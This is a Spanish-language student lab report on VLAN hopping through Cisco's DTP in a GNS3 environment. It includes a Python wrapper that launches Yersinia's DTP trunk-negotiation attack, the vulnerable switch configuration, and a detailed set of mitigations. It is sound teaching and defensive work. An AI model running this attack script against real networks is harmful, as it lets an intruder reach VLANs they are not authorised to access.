# DTP-VLAN-Hopping



LABORATORIO DE SEGURIDAD DE REDES
SEMANA 4 — VLAN HOPPING VIA DTP


Darwing Manuel Peña Reyes
Matrícula: 2024-2690

Profesor: Jonathan Rondón
Asignatura: Seguridad de Redes

Junio 2026
 
1. Objetivo del Laboratorio

El presente laboratorio tiene como objetivo demostrar de forma práctica y controlada el ataque conocido como VLAN Hopping mediante el protocolo DTP (Dynamic Trunking Protocol) de Cisco.

Específicamente, se busca:
•	Comprender el funcionamiento del protocolo DTP y sus implicaciones de seguridad.
•	Demostrar cómo un atacante puede convertir un puerto de acceso (access) en un puerto troncal (trunk), obteniendo visibilidad sobre múltiples VLANs de la red.
•	Evidenciar el impacto real del ataque sobre una red segmentada por VLANs.
•	Aplicar y verificar las contramedidas de mitigación recomendadas por Cisco.

Entorno: GNS3 con switch IOSvL2 y máquina virtual Kali Linux integrada vía VMware.

2. Objetivo del Script

El script dtp_ataque.py tiene como objetivo automatizar el envío de frames DTP maliciosos hacia un switch Cisco que tenga puertos configurados en modo dynamic auto, forzando la negociación de un enlace troncal de forma no autorizada.

2.1 Parámetros Usados

Al ejecutar el script, el usuario debe proporcionar los siguientes parámetros de forma interactiva:

Parámetro	Descripción	Ejemplo
Opción	Selección del modo de ataque (1 = Iniciar ataque DTP)	1
Interfaz	Nombre de la interfaz de red conectada al switch	eth0
Duración	Tiempo en segundos que durará el ataque	45
Confirmación	Confirmación explícita antes de ejecutar	YES

2.2 Requisitos para Utilizar la Herramienta

Sistema operativo:
•	Kali Linux (recomendado) u otra distribución Linux con Python 3.

Dependencias de software:
•	Python 3.x
•	Yersinia (herramienta de ataques de red de capa 2)

Instalación de dependencias:
sudo apt update
sudo apt install -y yersinia python3

Requisitos de red:
•	La máquina atacante debe estar conectada físicamente al switch objetivo.
•	El puerto del switch debe estar en modo dynamic auto (configuración vulnerable por defecto).
•	El usuario debe ejecutar el script con privilegios root (sudo).

3. Documentación del Funcionamiento del Script

3.1 Descripción General

El script dtp_ataque.py actúa como un wrapper interactivo sobre la herramienta Yersinia, proporcionando una interfaz amigable que solicita parámetros al usuario antes de ejecutar el ataque DTP.

3.2 Flujo de Ejecución

•	Verificación de privilegios: El script comprueba que se esté ejecutando como root. Si no es así, muestra un mensaje de error y termina.
•	Presentación del banner: Muestra información del laboratorio, estudiante y profesor.
•	Solicitud de parámetros: Pide al usuario la opción, interfaz de red, duración y confirmación.
•	Ejecución del ataque: Lanza Yersinia en modo DTP con los parámetros especificados usando subprocess.Popen.
•	Monitoreo en tiempo real: Muestra un contador de progreso durante la ejecución.
•	Finalización: Termina el proceso de Yersinia y muestra instrucciones de verificación.

3.3 Componente Técnico — Yersinia DTP Attack 1

Internamente, el script ejecuta el siguiente comando del sistema:
yersinia dtp -attack 1 -interface <interfaz>

Este comando hace que Yersinia envíe frames DTP con el campo status en modo desirable, lo que provoca que el switch en modo dynamic auto acepte la negociación y convierta el puerto en trunk.

3.4 Código Fuente Documentado

#!/usr/bin/env python3
# Laboratorio: VLAN Hopping mediante negociacion DTP
# Darwing Manuel Peña Reyes | 2024-2690

import subprocess, sys, time, os

def verificar_root():
    # Verifica que el script se ejecute como root
    if os.geteuid() != 0: sys.exit(1)

def solicitar_parametros():
    # Solicita interfaz, duracion y confirmacion al usuario
    interfaz = input('Interfaz conectada al switch: ')
    duracion = int(input('Duracion en segundos: '))
    return interfaz, duracion

def ejecutar_ataque(interfaz, duracion):
    # Lanza yersinia como subproceso
    proc = subprocess.Popen(
        ['yersinia', 'dtp', '-attack', '1', '-interface', interfaz],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duracion)
    proc.terminate()

4. Documentación de la Red

4.1 Topología

La topología utilizada en este laboratorio consiste en tres nodos conectados a un switch central IOSvL2 en GNS3:

[ kali-guest-1 ]  ←→  Gi0/1  ←→  [ SW ]  ←→  Gi0/0  ←→  [ Darwing20242690L-1 ]
                              ↕  Gi0/2
                           [ R1 f0/0 ]

4.2 Dispositivos e Interfaces

Dispositivo	Rol	Interfaz SW	Interfaz Local
SW (IOSvL2)	Switch central	—	Gi0/0, Gi0/1, Gi0/2
Darwing20242690L-1	Host atacante (Kali VMware)	Gi0/0	eth0
kali-guest-1	Host víctima / prueba	Gi0/1	e0
R1	Router gateway	Gi0/2	f0/0

4.3 VLANs Configuradas

VLAN ID	Nombre	Propósito
10	CORPORATIVA	Red de producción / host víctima
20	ATACANTE	Red donde reside el atacante
999	NATIVA_SEGURA	VLAN nativa sin usuarios (seguridad)

4.4 Direccionamiento IP

El esquema de direccionamiento está basado en la matrícula del estudiante 2024-2690, derivando el octeto base 20.24.26.90:

Dispositivo	Interfaz	VLAN	Dirección IP	Gateway
Darwing20242690L-1	eth0	VLAN 10	20.24.26.90/24	20.24.26.1
kali-guest-1	e0	VLAN 20	20.24.20.90/24	20.24.20.1
R1	f0/0.10	VLAN 10	20.24.26.1/24	—
R1	f0/0.20	VLAN 20	20.24.20.1/24	—

4.5 Configuración del Puerto Vulnerable (Antes del Ataque)

El puerto Gi0/0 se configuró en modo dynamic auto para simular un puerto vulnerable:
interface GigabitEthernet0/0
 switchport trunk encapsulation dot1q
 switchport mode dynamic auto
 switchport access vlan 10
 switchport trunk native vlan 10
 switchport trunk allowed vlan 10,20
 no shutdown

5. Capturas de Pantalla

Las siguientes capturas documentan el proceso completo del ataque y su mitigación:

5.1 Estado Inicial — Sin Trunks Activos

Antes de ejecutar el ataque, se verifica que no existen interfaces troncales activas:
SW# show interfaces trunk
SW#

[ Insertar captura: show interfaces trunk vacío ]

5.2 Ejecución del Script de Ataque

Se ejecuta el script dtp_ataque.py desde la máquina atacante Darwing20242690L-1:
sudo python3 ~/dtp_ataque.py

[ Insertar captura: ejecución del script con parámetros ]

5.3 Resultado del Ataque — Trunk Negociado

Luego de ejecutar el script, se verifica nuevamente el estado de los trunks en el switch:
SW# show interfaces trunk

[ Insertar captura: Gi0/0 aparece como trunking ]

5.4 Verificación Post-Mitigación

Tras aplicar las contramedidas, el ataque ya no tiene efecto:
[ Insertar captura: show interfaces trunk vacío tras mitigación ]

6. Contramedidas y Mitigación

A continuación se documentan las cinco contramedidas recomendadas para prevenir ataques de VLAN Hopping mediante DTP:

6.1 Forzar Modo Access y Deshabilitar DTP

Los puertos conectados a dispositivos finales deben fijarse explícitamente en modo access y deshabilitarse la negociación DTP con switchport nonegotiate:
interface GigabitEthernet0/0
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
 spanning-tree portfast

6.2 Configurar Trunks Manualmente

Los enlaces troncales deben configurarse de forma explícita únicamente en las interfaces que lo requieran, deshabilitando también DTP en ellos:
interface GigabitEthernet0/2
 switchport trunk encapsulation dot1q
 switchport mode trunk
 switchport trunk allowed vlan 10,20
 switchport nonegotiate

6.3 Restringir VLANs Permitidas en el Trunk

No permitir todas las VLANs en el enlace troncal. Solo se deben permitir las VLANs estrictamente necesarias:
switchport trunk allowed vlan 10,20

6.4 Cambiar la VLAN Nativa

Configurar una VLAN nativa que no esté en uso por usuarios o dispositivos de producción, evitando que el tráfico sin etiquetar caiga en redes operativas:
switchport trunk native vlan 999

6.5 Apagar Puertos en Desuso

Deshabilitar administrativamente todos los puertos del switch que no estén en uso, ya que por defecto vienen con configuraciones que permiten negociación DTP:
interface range GigabitEthernet0/3 - 3
 shutdown

6.6 Resumen de Contramedidas

#	Contramedida	Comando clave	Impacto
1	Modo access forzado	switchport mode access	Impide negociación DTP
2	Deshabilitar DTP	switchport nonegotiate	Ignora frames DTP entrantes
3	Trunk manual	switchport mode trunk	Solo donde sea necesario
4	Restringir VLANs	switchport trunk allowed vlan	Limita el alcance
5	VLAN nativa segura	switchport trunk native vlan 999	Aísla tráfico sin etiquetar
6	Puertos en desuso	shutdown	Elimina superficie de ataque

7. Referencias

•	Cisco Systems. (2024). Catalyst Switch Security Configuration Guide. Cisco Press.
•	Yersinia — Framework for layer 2 attacks. https://github.com/tomac/yersinia
•	IEEE 802.1Q — Virtual Bridged Local Area Networks Standard.
•	Repositorio del laboratorio: https://github.com/Darwing2024-2690/DTP-VLAN-Hopping
